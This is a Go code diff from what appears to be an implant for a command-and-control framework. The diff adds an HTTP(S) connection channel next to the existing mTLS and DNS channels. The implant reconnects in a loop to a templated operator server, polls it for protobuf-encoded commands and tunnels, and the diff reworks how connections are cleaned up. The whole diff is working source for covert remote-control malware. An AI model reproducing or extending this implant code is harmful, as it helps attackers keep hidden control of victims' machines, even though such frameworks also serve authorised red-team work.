@@ -4,6 +4,12 @@ import (
 	"crypto/x509"
 	"io"
 
+	// {{if .HTTPServer}}
+	"net"
+	"net/url"
+
+	// {{end}}
+
 	// {{if .Debug}}
 	"log"
 	// {{end}}
@@ -13,6 +19,10 @@ import (
 	"strconv"
 	"sync"
 	"time"
+
+	// {{if .HTTPServer}}
+	"github.com/golang/protobuf/proto"
+	// {{end}}
 )
 
 var (
@@ -40,10 +50,16 @@ var (
 type Connection struct {
 	Send    chan *pb.Envelope
 	Recv    chan *pb.Envelope
-	Ctrl    chan bool
-	Cleanup func()
+	ctrl    chan bool
+	cleanup func()
+	once    *sync.Once
 	tunnels *map[uint64]*Tunnel
 	mutex   *sync.RWMutex
+}
+
+// Cleanup - Execute cleanup once
+func (c *Connection) Cleanup() {
+	c.once.Do(c.cleanup)
 }
 
 // Tunnel - Duplex byte read/write
@@ -99,6 +115,18 @@ func StartConnectionLoop() *Connection {
 		connectionAttempts++
 		// {{end}}  - MTLSServer
 
+		// *** HTTP ***
+		// {{if .HTTPServer}}
+		connection, err = httpConnect()
+		if err == nil {
+			return connection
+		}
+		// {{if .Debug}}
+		log.Printf("[mtls] Connection failed %s", err)
+		// {{end}}
+		connectionAttempts++
+		// {{end}} - HTTPServer
+
 		// *** DNS ***
 		// {{if .DNSParent}}
 		connection, err = dnsConnect()
@@ -111,6 +139,9 @@ func StartConnectionLoop() *Connection {
 		connectionAttempts++
 		// {{end}} - DNSParent
 
+		// {{if .Debug}}
+		log.Printf("sleep ...")
+		// {{end}}
 		time.Sleep(reconnectInterval)
 	}
 	// {{if .Debug}}
@@ -144,22 +175,29 @@ func mtlsConnect() (*Connection, error) {
 	connection := &Connection{
 		Send:    send,
 		Recv:    recv,
-		Ctrl:    ctrl,
+		ctrl:    ctrl,
 		tunnels: &map[uint64]*Tunnel{},
 		mutex:   &sync.RWMutex{},
-		Cleanup: func() {
+		once:    &sync.Once{},
+		cleanup: func() {
+			// {{if .Debug}}
+			log.Printf("[mtls] lost connection, cleanup...")
+			// {{end}}
+			close(send)
 			conn.Close()
+			close(recv)
 		},
 	}
 
 	go func() {
+		defer connection.Cleanup()
 		for envelope := range send {
 			socketWriteEnvelope(conn, envelope)
 		}
 	}()
 
 	go func() {
-		defer func() { ctrl <- true }()
+		defer connection.Cleanup()
 		for {
 			envelope, err := socketReadEnvelope(conn)
 			if err == io.EOF {
@@ -184,6 +222,102 @@ func getDefaultMTLSLPort() int {
 	return lport
 }
 
+// {{if .HTTPServer}}
+func httpConnect() (*Connection, error) {
+	address := getHTTPAddress()
+	// {{if .Debug}}
+	log.Printf("Connecting -> http(s)://%s", address)
+	// {{end}}
+	client, err := HTTPStartSession(address)
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("http(s) connection error %v", err)
+		// {{end}}
+		return nil, err
+	}
+
+	send := make(chan *pb.Envelope)
+	recv := make(chan *pb.Envelope)
+	ctrl := make(chan bool, 1)
+	connection := &Connection{
+		Send:    send,
+		Recv:    recv,
+		ctrl:    ctrl,
+		tunnels: &map[uint64]*Tunnel{},
+		mutex:   &sync.RWMutex{},
+		once:    &sync.Once{},
+		cleanup: func() {
+			// {{if .Debug}}
+			log.Printf("[http] lost connection, cleanup...")
+			// {{end}}
+			close(send)
+			ctrl <- true
+			close(recv)
+		},
+	}
+
+	go func() {
+		defer connection.Cleanup()
+		for envelope := range send {
+			data, _ := proto.Marshal(envelope)
+			// {{if .Debug}}
+			log.Printf("[http] send envelope ...")
+			// {{end}}
+			go client.Send(data)
+		}
+	}()
+
+	go func() {
+		defer connection.Cleanup()
+		for {
+			select {
+			case <-ctrl:
+				return
+			default:
+				resp, err := client.Poll()
+				switch err := err.(type) {
+				case nil:
+					envelope := &pb.Envelope{}
+					proto.Unmarshal(resp, envelope)
+					if err != nil {
+						continue
+					}
+					recv <- envelope
+				case net.Error:
+					if err.Timeout() {
+						// {{if .Debug}}
+						log.Printf("non-fatal error, continue")
+						// {{end}}
+						continue
+					}
+					return
+				case *url.Error:
+					if err, ok := err.Err.(net.Error); ok && err.Timeout() {
+						// {{if .Debug}}
+						log.Printf("non-fatal error, continue")
+						// {{end}}
+						continue
+					}
+					return
+				default:
+					// {{if .Debug}}
+					log.Printf("[http] error: %#v", err)
+					// {{end}}
+					return
+				}
+			}
+		}
+	}()
+
+	return connection, nil
+}
+
+func getHTTPAddress() string {
+	return "{{.HTTPServer}}:{{.HTTPLPort}}"
+}
+
+// {{end}} -HTTPServer
+
 // {{if .DNSParent}}
 func dnsConnect() (*Connection, error) {
 	// {{if .Debug}}
@@ -199,27 +333,35 @@ func dnsConnect() (*Connection, error) {
 
 	send := make(chan *pb.Envelope)
 	recv := make(chan *pb.Envelope)
-	pollCtrl := make(chan bool)
-	ctrl := make(chan bool)
+	ctrl := make(chan bool, 1)
 	connection := &Connection{
 		Send:    send,
 		Recv:    recv,
-		Ctrl:    ctrl,
+		ctrl:    ctrl,
 		tunnels: &map[uint64]*Tunnel{},
 		mutex:   &sync.RWMutex{},
-		Cleanup: func() {
-			pollCtrl <- true // Stop polling
-			close(pollCtrl)
+		once:    &sync.Once{},
+		cleanup: func() {
+			// {{if .Debug}}
+			log.Printf("[dns] lost connection, cleanup...")
+			// {{end}}
+			close(send)
+			ctrl <- true // Stop polling
+			close(recv)
 		},
 	}
 
 	go func() {
+		defer connection.Cleanup()
 		for envelope := range send {
-			go dnsSessionSendEnvelope(dnsParent, sessionID, sessionKey, envelope)
+			dnsSessionSendEnvelope(dnsParent, sessionID, sessionKey, envelope)
 		}
 	}()
 
-	go dnsSessionPoll(dnsParent, sessionID, sessionKey, pollCtrl, recv)
+	go func() {
+		defer connection.Cleanup()
+		dnsSessionPoll(dnsParent, sessionID, sessionKey, ctrl, recv)
+	}()
 
 	return connection, nil
 }
